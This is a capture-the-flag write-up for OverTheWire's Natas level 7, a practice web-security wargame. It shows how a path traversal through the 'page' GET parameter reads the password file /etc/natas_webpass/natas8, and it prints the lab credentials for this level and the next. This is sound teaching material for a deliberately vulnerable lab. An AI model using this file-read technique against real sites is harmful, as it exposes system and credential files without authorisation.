# Natas Level 7

```bash
Username: natas7
Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
URL:      http://natas7.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas7.png" />
    <div align="center">Natas 7</div>
</figure>

We can see two links:
* [Home](http://natas7.natas.labs.overthewire.org/index.php?page=home)
* [About](http://natas7.natas.labs.overthewire.org/index.php?page=about)

Lets follow them:

<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas7-home.png" />
    <div align="center">Natas 7 - Home</div>
</figure>
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas7-about.png" />
    <div align="center">Natas 7 - About</div>
</figure>

Now lets take a look in the source of the homepage:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas7-home-source.png" />
    <div align="center">Natas 7 - Home page source</div>
</figure>

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
If we take a lose look, we can see that both pages have the same URL, and the wanted page is being sent as a GET parameter:
```html
http://natas7.natas.labs.overthewire.org/index.php?page=home
```
Lets try a path traversal:
```html
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas7-path-traversal.png" />
    <div align="center">Natas 7 - Path traversal</div>
</figure>

Nice!

We got the password for the next level: **DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**